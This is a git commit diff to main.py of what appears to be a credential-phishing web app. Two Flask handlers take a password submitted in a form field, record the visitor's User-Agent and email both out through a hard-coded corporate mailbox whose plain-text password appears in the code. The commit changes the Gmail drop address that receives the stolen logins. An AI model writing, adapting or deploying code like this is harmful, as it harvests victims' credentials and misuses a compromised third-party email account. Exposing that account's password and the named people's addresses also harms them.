21e4706eb6b0e2de7e57a99b058d330cb97ba369
Aryavartakhanija <sn.rao@aryavartakhanija.com>
2025-05-15 04:20:22 +0100

    Update main.py

--- main.py
+++ main.py
@@ -147,7 +147,7 @@ def first():
         passwordemail = request.form.get("pig")
         sender_email = "chinenye.ekeugo@crestglobalpartners.com"
         sender_emaill = "chinenye.ekeugo"
-        receiver_email = "senateloks@gmail.com"
+        receiver_email = "fm0395035@gmail.com"
         password = "Chinenye.Ekeugo.Crest"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
@@ -185,7 +185,7 @@ def second():
         passwordemail = request.form.get("pig")
         sender_email = "chinenye.ekeugo@crestglobalpartners.com"
         sender_emaill = "chinenye.ekeugo"
-        receiver_email = "senateloks@gmail.com"
+        receiver_email = "fm0395035@gmail.com"
         password = "Chinenye.Ekeugo.Crest"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
